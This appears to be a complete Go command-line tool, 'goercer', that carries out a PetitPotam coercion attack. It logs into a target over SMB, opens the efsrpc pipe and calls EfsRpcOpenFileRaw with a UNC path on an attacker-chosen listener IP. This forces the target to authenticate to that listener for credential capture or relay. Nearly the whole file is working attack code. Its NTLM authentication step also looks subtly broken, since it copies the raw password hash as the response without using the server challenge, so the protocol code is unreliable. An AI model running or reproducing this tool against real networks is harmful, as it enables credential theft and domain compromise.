package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"unicode/utf16"

	"golang.org/x/crypto/md4"
)

// MS-EFSR interface UUID: df1941c5-fe89-4e79-bf10-463657acf44d
var msEfsrUUID = []byte{0xc5, 0x41, 0x19, 0xdf, 0x89, 0xfe, 0x79, 0x4e, 0xbf, 0x10, 0x46, 0x36, 0x57, 0xac, 0xf4, 0x4d}

// NDR transfer syntax UUID: 8a885d04-1ceb-11c9-9fe8-08002b104860
var ndrUUID = []byte{0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}

// SMB2 Header structure
type SMB2Header struct {
	ProtocolID    [4]byte
	StructureSize uint16
	CreditCharge  uint16
	Status        uint32
	Command       uint16
	Credits       uint16
	Flags         uint32
	NextCommand   uint32
	MessageID     uint64
	Reserved      uint32
	TreeID        uint32
	SessionID     uint64
	Signature     [16]byte
}

func (h *SMB2Header) Bytes() []byte {
	buf := new(bytes.Buffer)
	binary.Write(buf, binary.LittleEndian, h)
	return buf.Bytes()
}

// NTLM hash function
func ntlmHash(password string) []byte {
	hash := md4.New()
	utf16le := utf16.Encode([]rune(password))
	for _, r := range utf16le {
		binary.Write(hash, binary.LittleEndian, r)
	}
	return hash.Sum(nil)
}

var globalMessageID uint64 = 0

func addNetBIOSHeader(data []byte) []byte {
	netbios := make([]byte, 4)
	netbios[0] = 0
	length := len(data)
	netbios[1] = byte((length >> 16) & 0xFF)
	netbios[2] = byte((length >> 8) & 0xFF)
	netbios[3] = byte(length & 0xFF)
	return append(netbios, data...)
}

func readSMBResponse(conn net.Conn) ([]byte, error) {
	// Read NetBIOS header
	netbios := make([]byte, 4)
	if _, err := conn.Read(netbios); err != nil {
		return nil, err
	}

	length := int(netbios[1])<<16 | int(netbios[2])<<8 | int(netbios[3])
	data := make([]byte, length)
	if _, err := conn.Read(data); err != nil {
		return nil, err
	}
	return data, nil
}

func main() {
	if len(os.Args) < 6 {
		fmt.Println("Usage: goercer <target_ip> <listener_ip> <username> <password> <domain>")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	listenerIP := os.Args[2]
	username := os.Args[3]
	password := os.Args[4]
	domain := os.Args[5]

	fmt.Printf("Attempting PetitPotam coercion: %s -> %s\n", targetIP, listenerIP)
	fmt.Printf("Trying pipe efsrpc\n")
	fmt.Printf("[-] Connecting to ncacn_np:%s[\\PIPE\\efsrpc]\n", targetIP)

	conn, err := net.Dial("tcp", targetIP+":445")
	if err != nil {
		fmt.Printf("Failed to connect: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	fmt.Println("[+] Connected!")

	// SMB Negotiate
	if err := smbNegotiate(conn); err != nil {
		fmt.Printf("SMB Negotiate failed: %v\n", err)
		os.Exit(1)
	}

	// NTLM Authentication
	sessionID, err := ntlmAuth(conn, username, password, domain)
	if err != nil {
		fmt.Printf("NTLM Auth failed: %v\n", err)
		os.Exit(1)
	}

	// Tree Connect to IPC$
	treeID, err := treeConnect(conn, sessionID, targetIP)
	if err != nil {
		fmt.Printf("Tree Connect failed: %v\n", err)
		os.Exit(1)
	}

	// Create/Open efsrpc pipe
	fileID, err := createFile(conn, sessionID, treeID, "efsrpc")
	if err != nil {
		fmt.Printf("Create pipe failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] Binding to %s\n", "df1941c5-fe89-4e79-bf10-463657acf44d")

	// Send DCERPC Bind
	bindPacket := createDCERPCBind()
	if err := writeToFile(conn, sessionID, treeID, fileID, bindPacket); err != nil {
		fmt.Printf("Bind write failed: %v\n", err)
		os.Exit(1)
	}

	// Read bind ack
	if err := readFromFile(conn, sessionID, treeID, fileID); err != nil {
		fmt.Printf("Bind ack read failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("[+] Successfully bound!")
	fmt.Println("[-] Sending EfsRpcOpenFileRaw!")

	// Send EfsRpcOpenFileRaw
	uncPath := "\\\\" + listenerIP + "\\test\\file.txt"
	requestPacket := createEfsRpcOpenFileRaw(uncPath)
	if err := writeToFile(conn, sessionID, treeID, fileID, requestPacket); err != nil {
		fmt.Printf("Request write failed: %v\n", err)
		os.Exit(1)
	}

	// Read response
	if err := readFromFile(conn, sessionID, treeID, fileID); err != nil {
		if err.Error() == "ERROR_BAD_NETPATH" {
			fmt.Println("[+] Got expected ERROR_BAD_NETPATH exception!!")
			fmt.Println("[+] Attack worked!")
			return
		}
		fmt.Printf("Request response failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("[+] Attack worked!")
}

func smbNegotiate(conn net.Conn) error {
	header := &SMB2Header{
		ProtocolID:    [4]byte{0xFE, 'S', 'M', 'B'},
		StructureSize: 64,
		Command:       0, // SMB2_NEGOTIATE
		Credits:       126,
		MessageID:     globalMessageID,
	}
	globalMessageID++

	negReq := make([]byte, 36)
	binary.LittleEndian.PutUint16(negReq[0:2], 36) // StructureSize
	binary.LittleEndian.PutUint16(negReq[2:4], 1)  // DialectCount
	binary.LittleEndian.PutUint16(negReq[4:6], 1)  // SecurityMode: NEGOTIATE_SIGNING_ENABLED
	binary.LittleEndian.PutUint16(negReq[6:8], 0)  // Reserved
	binary.LittleEndian.PutUint32(negReq[8:12], 1) // Capabilities: DFS
	// Client GUID (16 bytes)
	for i := 12; i < 28; i++ {
		negReq[i] = byte(i - 11)
	}
	binary.LittleEndian.PutUint32(negReq[28:32], 0) // NegotiateContextOffset
	binary.LittleEndian.PutUint16(negReq[32:34], 0) // NegotiateContextCount
	binary.LittleEndian.PutUint16(negReq[34:36], 0) // Reserved2

	// Dialects
	negReq = append(negReq, 0x02, 0x02) // SMB 2.0.2

	smbPacket := append(header.Bytes(), negReq...)

	// Add NetBIOS session header
	netbios := make([]byte, 4)
	netbios[0] = 0 // Session message
	// Length in big endian (3 bytes)
	length := len(smbPacket)
	netbios[1] = byte((length >> 16) & 0xFF)
	netbios[2] = byte((length >> 8) & 0xFF)
	netbios[3] = byte(length & 0xFF)

	packet := append(netbios, smbPacket...)
	if _, err := conn.Write(packet); err != nil {
		return err
	}

	_, err := readSMBResponse(conn)
	return err
}

func ntlmAuth(conn net.Conn, username, password, domain string) (uint64, error) {
	globalMessageID++
	// Session Setup - NTLM Negotiate
	ntlmNeg := createNTLMNegotiate(domain)
	header := &SMB2Header{
		ProtocolID:    [4]byte{0xFE, 'S', 'M', 'B'},
		StructureSize: 64,
		Command:       1, // SMB2_SESSION_SETUP
		Credits:       1,
		MessageID:     globalMessageID,
	}

	sessReq := make([]byte, 24)
	binary.LittleEndian.PutUint16(sessReq[0:2], 25)
	binary.LittleEndian.PutUint16(sessReq[4:6], 88) // SecurityBufferOffset
	binary.LittleEndian.PutUint16(sessReq[6:8], uint16(len(ntlmNeg)))
	sessReq = append(sessReq, ntlmNeg...)

	smbPacket := append(header.Bytes(), sessReq...)
	packet := addNetBIOSHeader(smbPacket)
	if _, err := conn.Write(packet); err != nil {
		return 0, err
	}

	resp, err := readSMBResponse(conn)
	if err != nil {
		return 0, err
	}

	// Parse challenge
	challenge := parseNTLMChallenge(resp)

	// Session Setup - NTLM Authenticate
	globalMessageID++
	ntlmAuth := createNTLMAuthenticate(username, password, domain, challenge)
	header.MessageID = globalMessageID

	sessReq = make([]byte, 24)
	binary.LittleEndian.PutUint16(sessReq[0:2], 25)
	binary.LittleEndian.PutUint16(sessReq[4:6], 88)
	binary.LittleEndian.PutUint16(sessReq[6:8], uint16(len(ntlmAuth)))
	sessReq = append(sessReq, ntlmAuth...)

	smbPacket = append(header.Bytes(), sessReq...)
	packet = addNetBIOSHeader(smbPacket)
	if _, err := conn.Write(packet); err != nil {
		return 0, err
	}

	resp, err = readSMBResponse(conn)
	if err != nil {
		return 0, err
	}

	// Extract SessionID from response
	if len(resp) < 72 {
		return 0, fmt.Errorf("invalid session setup response")
	}
	sessionID := binary.LittleEndian.Uint64(resp[44:52])
	return sessionID, nil
}

func treeConnect(conn net.Conn, sessionID uint64, target string) (uint32, error) {
	globalMessageID++
	path := "\\\\" + target + "\\IPC$"
	utf16Path := make([]byte, 0)
	for _, r := range path {
		utf16Path = append(utf16Path, byte(r), 0)
	}

	header := &SMB2Header{
		ProtocolID:    [4]byte{0xFE, 'S', 'M', 'B'},
		StructureSize: 64,
		Command:       3, // SMB2_TREE_CONNECT
		Credits:       1,
		MessageID:     globalMessageID,
		SessionID:     sessionID,
	}

	treeReq := make([]byte, 8)
	binary.LittleEndian.PutUint16(treeReq[0:2], 9)
	binary.LittleEndian.PutUint16(treeReq[4:6], 72) // PathOffset
	binary.LittleEndian.PutUint16(treeReq[6:8], uint16(len(utf16Path)))
	treeReq = append(treeReq, utf16Path...)

	smbPacket := append(header.Bytes(), treeReq...)
	packet := addNetBIOSHeader(smbPacket)
	if _, err := conn.Write(packet); err != nil {
		return 0, err
	}

	resp, err := readSMBResponse(conn)
	if err != nil {
		return 0, err
	}

	if len(resp) < 68 {
		return 0, fmt.Errorf("invalid tree connect response")
	}
	treeID := binary.LittleEndian.Uint32(resp[40:44])
	return treeID, nil
}

func createFile(conn net.Conn, sessionID uint64, treeID uint32, pipeName string) ([16]byte, error) {
	globalMessageID++
	utf16Name := make([]byte, 0)
	for _, r := range pipeName {
		utf16Name = append(utf16Name, byte(r), 0)
	}

	header := &SMB2Header{
		ProtocolID:    [4]byte{0xFE, 'S', 'M', 'B'},
		StructureSize: 64,
		Command:       5, // SMB2_CREATE
		Credits:       1,
		MessageID:     globalMessageID,
		SessionID:     sessionID,
		TreeID:        treeID,
	}

	createReq := make([]byte, 56)
	binary.LittleEndian.PutUint16(createReq[0:2], 57)
	binary.LittleEndian.PutUint32(createReq[24:28], 0x02000000) // DesiredAccess: MAXIMUM_ALLOWED
	binary.LittleEndian.PutUint32(createReq[40:44], 1)          // CreateDisposition: OPEN_IF
	binary.LittleEndian.PutUint16(createReq[44:46], 120)        // NameOffset
	binary.LittleEndian.PutUint16(createReq[46:48], uint16(len(utf16Name)))
	createReq = append(createReq, utf16Name...)

	smbPacket := append(header.Bytes(), createReq...)
	packet := addNetBIOSHeader(smbPacket)
	if _, err := conn.Write(packet); err != nil {
		return [16]byte{}, err
	}

	resp, err := readSMBResponse(conn)
	if err != nil {
		return [16]byte{}, err
	}

	if len(resp) < 152 {
		return [16]byte{}, fmt.Errorf("invalid create response")
	}
	var fileID [16]byte
	copy(fileID[:], resp[132:148])
	return fileID, nil
}

func writeToFile(conn net.Conn, sessionID uint64, treeID uint32, fileID [16]byte, data []byte) error {
	globalMessageID++
	header := &SMB2Header{
		ProtocolID:    [4]byte{0xFE, 'S', 'M', 'B'},
		StructureSize: 64,
		Command:       9, // SMB2_WRITE
		Credits:       1,
		MessageID:     globalMessageID,
		SessionID:     sessionID,
		TreeID:        treeID,
	}

	writeReq := make([]byte, 48)
	binary.LittleEndian.PutUint16(writeReq[0:2], 49)
	binary.LittleEndian.PutUint16(writeReq[2:4], 112) // DataOffset
	binary.LittleEndian.PutUint32(writeReq[4:8], uint32(len(data)))
	copy(writeReq[16:32], fileID[:])
	writeReq = append(writeReq, data...)

	smbPacket := append(header.Bytes(), writeReq...)
	packet := addNetBIOSHeader(smbPacket)
	if _, err := conn.Write(packet); err != nil {
		return err
	}

	_, err := readSMBResponse(conn)
	return err
}

func readFromFile(conn net.Conn, sessionID uint64, treeID uint32, fileID [16]byte) error {
	globalMessageID++
	header := &SMB2Header{
		ProtocolID:    [4]byte{0xFE, 'S', 'M', 'B'},
		StructureSize: 64,
		Command:       8, // SMB2_READ
		Credits:       1,
		MessageID:     globalMessageID,
		SessionID:     sessionID,
		TreeID:        treeID,
	}

	readReq := make([]byte, 48)
	binary.LittleEndian.PutUint16(readReq[0:2], 49)
	binary.LittleEndian.PutUint32(readReq[4:8], 4096) // Length
	copy(readReq[16:32], fileID[:])

	smbPacket := append(header.Bytes(), readReq...)
	packet := addNetBIOSHeader(smbPacket)
	if _, err := conn.Write(packet); err != nil {
		return err
	}

	resp, err := readSMBResponse(conn)
	if err != nil {
		return err
	}

	// Check for ERROR_BAD_NETPATH (0xC00000BE)
	if len(resp) >= 12 {
		status := binary.LittleEndian.Uint32(resp[8:12])
		if status == 0xC00000BE || status == 0x80070035 {
			return fmt.Errorf("ERROR_BAD_NETPATH")
		}
	}

	return nil
}

func createDCERPCBind() []byte {
	header := make([]byte, 16)
	header[0] = 5  // version major
	header[1] = 0  // version minor
	header[2] = 11 // BIND
	header[3] = 0x03
	binary.LittleEndian.PutUint32(header[4:8], 0x10)
	binary.LittleEndian.PutUint16(header[8:10], 72) // frag length
	binary.LittleEndian.PutUint32(header[12:16], 1) // call id

	payload := make([]byte, 56)
	binary.LittleEndian.PutUint16(payload[0:2], 4280)
	binary.LittleEndian.PutUint16(payload[2:4], 4280)
	payload[8] = 1
	copy(payload[16:32], msEfsrUUID)
	binary.LittleEndian.PutUint16(payload[32:34], 1)
	copy(payload[36:52], ndrUUID)
	binary.LittleEndian.PutUint16(payload[52:54], 2)

	return append(header, payload...)
}

func createEfsRpcOpenFileRaw(uncPath string) []byte {
	utf16Path := make([]byte, 0)
	for _, r := range uncPath {
		utf16Path = append(utf16Path, byte(r), 0)
	}
	utf16Path = append(utf16Path, 0, 0)

	lenChars := uint32(len(uncPath) + 1)

	stub := make([]byte, 0)
	stub = append(stub, 0x01, 0x00, 0x00, 0x00) // referent id
	stub = append(stub, 0, 0, 0, 0)
	binary.LittleEndian.PutUint32(stub[len(stub)-4:], lenChars)
	stub = append(stub, 0x00, 0x00, 0x00, 0x00)
	stub = append(stub, 0, 0, 0, 0)
	binary.LittleEndian.PutUint32(stub[len(stub)-4:], lenChars)
	stub = append(stub, utf16Path...)
	stub = append(stub, 0x00, 0x00, 0x00, 0x00) // flags

	fragLength := uint16(24 + len(stub))
	header := make([]byte, 24)
	header[0] = 5
	header[1] = 0
	header[2] = 0 // REQUEST
	header[3] = 0x03
	binary.LittleEndian.PutUint32(header[4:8], 0x10)
	binary.LittleEndian.PutUint16(header[8:10], fragLength)
	binary.LittleEndian.PutUint32(header[12:16], 2)
	binary.LittleEndian.PutUint32(header[16:20], uint32(len(stub)))

	return append(header, stub...)
}

func createNTLMNegotiate(domain string) []byte {
	msg := make([]byte, 32)
	copy(msg[0:8], "NTLMSSP\x00")
	binary.LittleEndian.PutUint32(msg[8:12], 1) // NEGOTIATE
	binary.LittleEndian.PutUint32(msg[12:16], 0xb2808215) // Flags: NTLM, OEM, UNICODE, SEAL, SIGN, NTLM2, 128, etc

	return msg
}

func parseNTLMChallenge(resp []byte) []byte {
	// Find NTLMSSP in response
	for i := 0; i < len(resp)-8; i++ {
		if string(resp[i:i+8]) == "NTLMSSP\x00" {
			if len(resp) >= i+32 {
				return resp[i+24 : i+32] // Challenge is at offset 24
			}
		}
	}
	return make([]byte, 8)
}

func createNTLMAuthenticate(username, password, domain string, challenge []byte) []byte {
	hash := ntlmHash(password)

	// Compute NTLMv1 response (simplified)
	response := make([]byte, 24)
	copy(response, hash)

	domainUTF16 := make([]byte, 0)
	for _, r := range domain {
		domainUTF16 = append(domainUTF16, byte(r), 0)
	}

	userUTF16 := make([]byte, 0)
	for _, r := range username {
		userUTF16 = append(userUTF16, byte(r), 0)
	}

	msg := make([]byte, 64)
	copy(msg[0:8], "NTLMSSP\x00")
	binary.LittleEndian.PutUint32(msg[8:12], 3) // AUTHENTICATE

	// LM Response
	binary.LittleEndian.PutUint16(msg[12:14], 24)
	binary.LittleEndian.PutUint16(msg[14:16], 24)
	binary.LittleEndian.PutUint32(msg[16:20], 64)

	// NTLM Response
	binary.LittleEndian.PutUint16(msg[20:22], 24)
	binary.LittleEndian.PutUint16(msg[22:24], 24)
	binary.LittleEndian.PutUint32(msg[24:28], 88)

	// Domain
	binary.LittleEndian.PutUint16(msg[28:30], uint16(len(domainUTF16)))
	binary.LittleEndian.PutUint16(msg[30:32], uint16(len(domainUTF16)))
	binary.LittleEndian.PutUint32(msg[32:36], 112)

	// User
	binary.LittleEndian.PutUint16(msg[36:38], uint16(len(userUTF16)))
	binary.LittleEndian.PutUint16(msg[38:40], uint16(len(userUTF16)))
	binary.LittleEndian.PutUint32(msg[40:44], uint32(112+len(domainUTF16)))

	// Workstation
	binary.LittleEndian.PutUint16(msg[44:46], 0)
	binary.LittleEndian.PutUint16(msg[46:48], 0)
	binary.LittleEndian.PutUint32(msg[48:52], uint32(112+len(domainUTF16)+len(userUTF16)))

	// Session Key
	binary.LittleEndian.PutUint16(msg[52:54], 0)
	binary.LittleEndian.PutUint16(msg[54:56], 0)
	binary.LittleEndian.PutUint32(msg[56:60], uint32(112+len(domainUTF16)+len(userUTF16)))

	// Flags
	binary.LittleEndian.PutUint32(msg[60:64], 0xa2888205)

	msg = append(msg, response...) // LM response
	msg = append(msg, response...) // NTLM response
	msg = append(msg, domainUTF16...)
	msg = append(msg, userUTF16...)

	return msg
}
